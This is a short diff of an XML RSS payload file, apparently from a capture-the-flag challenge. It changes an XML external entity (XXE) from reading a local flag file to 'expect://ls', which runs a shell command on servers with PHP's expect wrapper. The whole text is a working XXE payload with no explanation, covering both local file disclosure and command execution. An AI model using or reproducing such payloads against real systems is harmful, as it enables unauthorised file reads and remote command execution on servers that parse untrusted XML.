@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file:///flag_0f50902863437ebc6cbf66c903dd019e" >]>
+<!ENTITY xxe SYSTEM "expect://ls" >]>
 <rss>    
     <channel>    
         <item>
